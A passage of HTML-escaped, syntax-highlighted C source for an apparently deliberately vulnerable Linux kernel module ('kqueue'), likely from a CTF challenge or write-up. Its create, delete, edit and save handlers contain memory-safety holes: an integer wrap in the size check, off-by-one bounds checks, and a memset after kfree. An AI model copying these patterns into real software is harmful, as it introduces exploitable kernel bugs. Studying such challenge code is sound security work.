class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;create_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; result = INVALID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(queueCount &amp;gt; MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Max queue count reached&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* You can&amp;#x27;t ask for 0 queues , how meaningless */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.max_entries&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] kqueue entries should be greater than 0&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Asking for too much is also not good */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.data_size&amp;gt;MAX_DATA_SIZE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] kqueue data size exceed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Initialize kqueue_entry structure */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *kqueue_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if multiplication of 2 64 bit integers results in overflow */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull space = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(__builtin_umulll_overflow(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(queue_entry),(request.max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),&amp;amp;space) == &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Integer overflow&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Size is the size of queue structure + size of entry * request entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull queue_size = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(__builtin_saddll_overflow(&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;),space,&amp;amp;queue_size) == &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Integer overflow&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Total size should not exceed a certain limit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(queue_size&amp;gt;&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Max kqueue alloc limit reached&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* All checks done , now call kzalloc */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmalloc(queue_size,GFP_KERNEL));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Main queue can also store data */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data = validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmalloc(request.data_size,GFP_KERNEL));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Fill the remaining queue structure */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size   = request.data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries = request.max_entries;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size  = queue_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Get to the place from where memory has to be handled */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kqueue_entry = (queue_entry *)((&lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt;)(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; + (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Allocate all kqueue entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry* current_entry = kqueue_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry* prev_entry = current_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;request.max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(i!=request.max_entries)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            prev_entry-&amp;gt;next = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        current_entry-&amp;gt;idx = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        current_entry-&amp;gt;data = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)(validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kmalloc(request.data_size,GFP_KERNEL)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* Increment current_entry by size of queue_entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        current_entry += &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(queue_entry)/&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* Populate next pointer of the previous entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        prev_entry-&amp;gt;next = current_entry;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        prev_entry = prev_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Find an appropriate slot in kqueues */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; j = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(j=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;j&amp;lt;MAX_QUEUES;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueues[j] == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(j&amp;gt;MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] No kqueue slot left&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Assign the newly created kqueue to the kqueues */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kqueues[j] = &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queueCount++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for out of bounds requests */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.queue_idx&amp;gt;MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for existence of the request kqueue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = kqueues[request.queue_idx];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Requested kqueue does not exist&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kfree(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kqueues[request.queue_idx] = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check the idx of the kqueue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.queue_idx &amp;gt; MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid kqueue idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if the kqueue exists at that idx */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = kqueues[request.queue_idx];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] kqueue does not exist&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check the idx of the kqueue entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.entry_idx &amp;gt; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid kqueue entry_idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Get to the kqueue entry memory */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *kqueue_entry = (queue_entry *)(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; + (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for the existence of the kqueue entry */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exists = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/* If kqueue entry found , do the necessary */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueue_entry &amp;amp;&amp;amp; request.data &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueue_entry-&amp;gt;idx == request.entry_idx)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(kqueue_entry-&amp;gt;data,request.data,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                exists = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        kqueue_entry = kqueue_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* What if the idx is 0, it means we have to update the main kqueue&amp;#x27;s data */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.entry_idx==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; kqueue_entry &amp;amp;&amp;amp; request.data &amp;amp;&amp;amp; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data,request.data,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!exists)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; NOT_EXISTS;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Now you have the option to safely preserve your precious kqueues */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;save_kqueue_entries&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check for out of bounds queue_idx requests */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.queue_idx &amp;gt; MAX_QUEUES)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid kqueue idx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if queue is already saved or not */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(isSaved[request.queue_idx]==&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Queue already saved&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; *&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; = validate(kqueues[request.queue_idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check if number of requested entries exceed the existing entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.max_entries &amp;lt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; || request.max_entries &amp;gt; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;max_entries)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Invalid entry count&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Allocate memory for the kqueue to be saved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *new_queue = validate((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)kzalloc(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size,GFP_KERNEL));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Each saved entry can have its own size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(request.data_size &amp;gt; &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;queue_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Entry size limit exceed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Copy main&amp;#x27;s 